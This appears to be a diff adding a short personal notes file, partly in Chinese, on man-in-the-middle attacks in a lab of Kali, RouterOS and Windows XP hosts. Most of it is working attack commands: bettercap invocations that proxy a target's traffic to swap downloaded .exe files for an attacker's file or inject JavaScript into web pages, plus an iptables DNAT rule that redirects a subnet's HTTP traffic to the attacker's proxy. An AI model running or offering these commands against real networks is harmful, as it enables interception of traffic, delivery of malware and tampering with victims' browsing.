@@ -1,0 +1,49 @@
+[js注入]
+
+[]
+
+bettercap -I wlan0 -G 10.0.0.1 --no-spoofing --no-discovery -X --proxy-module
+replace_file.rb --file-extension exe --file-replace /root/Desktop/file.exe 
+
+bettercap -I eth0  --no-spoofing --no-discovery -X -T 192.168.88.80 --proxy -P
+GET --proxy-module injectjs --js-file rainbow.js
+
+https://github.com/sqqihao/bettercap-proxy-modules
+
+[info]
+kali
+10.0.2.15 
+192.168.56.11
+192.168.88.113
+routeros
+10.0.2.15
+192.168.88.111
+192.168.56.10
+xp
+192.168.88.80
+
+
+[目录]
+/var/lib/gems/2.3.0/gems/bettercap-1.6.2/lib/bettercap
+
+iptables -t nat -A PREROUTING  -s 192.168.56.10/24 -p tcp -j DNAT
+--to-destination 192.168.56.11:8080
+
+ bettercap -I eth1  --no-spoofing --no-discovery -X -T 192.168.56.10
+ --no-sslstrip --proxy  --proxy-module injectjs --js-file shakescreen.js
+  
+ [iptables]
+ Chain PREROUTING (policy ACCEPT)
+    target     prot opt source               destination         
+    DNAT       tcp  --  192.168.56.0/24      139.199.91.153       tcp dpt:80
+    to:192.168.56.11:8080
+
+    Chain INPUT (policy ACCEPT)
+    target     prot opt source               destination         
+
+    Chain OUTPUT (policy ACCEPT)
+    target     prot opt source               destination         
+
+    Chain POSTROUTING (policy ACCEPT)
+    target     prot opt source               destination         
+    MASQUERADE  all  --  0.0.0.0/0            0.0.0.0/0 
